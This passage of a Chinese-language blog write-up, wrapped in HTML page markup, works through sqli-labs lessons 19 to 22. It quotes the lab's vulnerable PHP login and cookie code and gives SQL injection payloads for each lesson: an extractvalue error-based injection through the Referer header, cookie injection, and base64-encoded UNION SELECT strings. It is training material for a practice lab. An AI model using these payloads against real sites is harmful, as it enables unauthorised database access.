+</span></span><span class="line"><span class="cl"><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$insert</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span></code></pre></div><p>与lesson-18的区别就是，这里的注入点在Referer,修改一下即可利用报错注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">=</span><span class="s1">&#39;and extractvalue(1,concat(0x7e,database(),0x7e)) and &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</span></span></code></pre></div><h4 id="lesson-20">lesson 20</h4>
+<p>根据提示，这道题是要利用cookie来进行注入，一看源代码发现比平时多出了好多，正好来练习一下读php</p>
+<p>第一次登陆
+cookie中没有 <code>uname</code> 的值，进入当前if
+用 <code>check_input</code> 过滤 <code>uname</code> 和 <code>passwd</code> 的值
+如果成功查询后，将查询到的username存到 <code>$cookee</code> 中，同时 <code>setcookie</code> 来设置 cookie</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">......</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$uname</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$passwd</span> <span class="o">=</span> <span class="nx">check_input</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;passwd&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT  users.username, users.password FROM users WHERE users.username=</span><span class="si">$uname</span><span class="s2"> and users.password=</span><span class="si">$passwd</span><span class="s2"> ORDER BY users.id DESC LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result1</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$row1</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result1</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cookee</span> <span class="o">=</span> <span class="nv">$row1</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$row1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34; font size = 3 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">setcookie</span><span class="p">(</span><span class="s1">&#39;uname&#39;</span><span class="p">,</span> <span class="nv">$cookee</span><span class="p">,</span> <span class="nx">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">header</span> <span class="p">(</span><span class="s1">&#39;Location: index.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;I LOVE YOU COOKIES&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size = 3 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// echo &#39;Your Cookie is: &#39; .$cookee;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/flag.jpg&#34; /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#0000ff&#34; font size=&#34;3&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">//echo &#34;Try again looser&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nx">print_r</span><span class="p">(</span><span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/slap.jpg&#34; /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;/font&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s1">&#39;&lt;/div&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>POST之后，response的header中可以看到设置的set-cookie</p>
+<!-- raw HTML omitted -->
+<figure><img src="/ox-hugo/2022-04-22_15-35-18_screenshot.png" width="700px"/>
+</figure>
+
+<p>如果cookie有值，那么进入当前 else,接着 <code>$cookee</code> 的值进行查询，此处就是可以注入的地方</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">else</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="nv">$cookee</span> <span class="o">=</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;uname&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$format</span> <span class="o">=</span> <span class="s1">&#39;D d M Y - H:i:s&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$timestamp</span> <span class="o">=</span> <span class="nx">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;center&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;img src=&#34;../images/Less-20.jpg&#34; /&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;br&gt;&lt;b&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;br&gt;&lt;font color= &#34;red&#34; font size=&#34;4&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;YOUR USER AGENT IS : &#34;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;cyan&#34; font size=&#34;4&#34;&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;YOUR IP ADDRESS IS : &#34;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;/font&gt;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;#FFFF00&#34; font size = 4 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;&lt;font color= &#34;orange&#34; font size = 5 &gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;YOUR COOKIE : uname = </span><span class="si">$cookee</span><span class="s2"> and expires: &#34;</span> <span class="o">.</span> <span class="nx">date</span><span class="p">(</span><span class="nv">$format</span><span class="p">,</span> <span class="nv">$timestamp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$cookee</span><span class="s2">&#39; LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Issue with your mysql: &#39;</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$con1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$row</span> <span class="o">=</span> <span class="nx">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span> <span class="nx">MYSQLI_BOTH</span><span class="p">);</span>
+</span></span></code></pre></div><p>修改 cookie 即可利用注入</p>
+<figure><img src="/ox-hugo/2022-04-22_15-39-37_screenshot.png" width="700px"/>
+</figure>
+
+<h4 id="lesson-21">lesson 21</h4>
+<p>看源码，和上一题基本类似，只不过这里多了一步base64加密，同时使用 <code>（‘’）</code> 进行包裹</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=(&#39;</span><span class="si">$cookee</span><span class="s2">&#39;) LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span></code></pre></div><p>因此我们需要要先将我们的注入语句用base64加密，再注入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;)union select 1,2,database()-- -
+</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-04-22_15-54-20_screenshot.png" width="700px"/>
+</figure>
+
+<h4 id="lesson-22">lesson 22</h4>
+<p>读源码，与lesson 21类似，只不过改了包裹的方法 <code>&quot;&quot;</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cookee</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$cookee</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$cookee1</span> <span class="o">=</span> <span class="s1">&#39;&#34;&#39;</span><span class="o">.</span> <span class="nv">$cookee</span><span class="o">.</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;br&gt;&lt;/font&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sql</span><span class="o">=</span><span class="s2">&#34;SELECT * FROM users WHERE username=</span><span class="si">$cookee1</span><span class="s2"> LIMIT 0,1&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span><span class="o">=</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$con1</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">);</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;union select 1,2,database()-- -
+</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-04-22_15-56-41_screenshot.png" width="700px"/>
+</figure>
+
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">ctf</a>
+        
+            <a href="/tags/sqli_injection/">sqli_injection</a>
+        
+            <a href="/tags/writeup/">writeup</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            Last updated on Apr 22, 2022 15:58 BST
+        </span>
+    </section></footer>
+
+
+    
+        <link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
+            ><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
+                defer
+                >
+            </script><script>
+    window.addEventListener("DOMContentLoaded", () => {
+        renderMathInElement(document.querySelector(`.article-content`), {
+            delimiters: [
+                { left: "$$", right: "$$", display: true },
+                { left: "$", right: "$", display: false },
+                { left: "\\(", right: "\\)", display: false },
+                { left: "\\[", right: "\\]", display: true }
+            ]
+        });})
+</script>
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script type="application/javascript">
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (DISQUS) {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2022 Under The Ginkgo
+    </section>
+    
+    <section class="powerby">
+        
+            Cogito, ergo sum <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sqli-labs-basic-challenges">Sqli-labs: Basic Challenges</a>
+      <ul>
+        <li><a href="#basic">Basic</a>
+          <ul>
+            <li><a href="#lesson-1">lesson 1</a></li>
+            <li><a href="#lesson-2">lesson 2</a></li>
+            <li><a href="#lesson-3">lesson 3</a></li>
+            <li><a href="#lesson-4">lesson 4</a></li>
+            <li><a href="#lesson-5">lesson 5</a></li>
+            <li><a href="#lesson-6">lesson 6</a></li>
+            <li><a href="#lesson-7">lesson 7</a></li>
+            <li><a href="#lesson-8">lesson 8</a></li>
+            <li><a href="#lesson-9">lesson 9</a></li>
+            <li><a href="#lesson-10">lesson 10</a></li>
+            <li><a href="#lesson-11">lesson 11</a></li>
+            <li><a href="#lesson-12">lesson 12</a></li>
+            <li><a href="#lesson-13">lesson 13</a></li>
+            <li><a href="#lesson-14">lesson 14</a></li>
+            <li><a href="#lesson-15">lesson 15</a></li>
+            <li><a href="#lesson-16">lesson 16</a></li>
+            <li><a href="#lesson-17">lesson 17</a></li>
+            <li><a href="#lesson-18">lesson 18</a></li>
+            <li><a href="#lesson-19">lesson 19</a></li>
+            <li><a href="#lesson-20">lesson 20</a></li>
+            <li><a href="#lesson-21">lesson 21</a></li>
+            <li><a href="#lesson-22">lesson 22</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
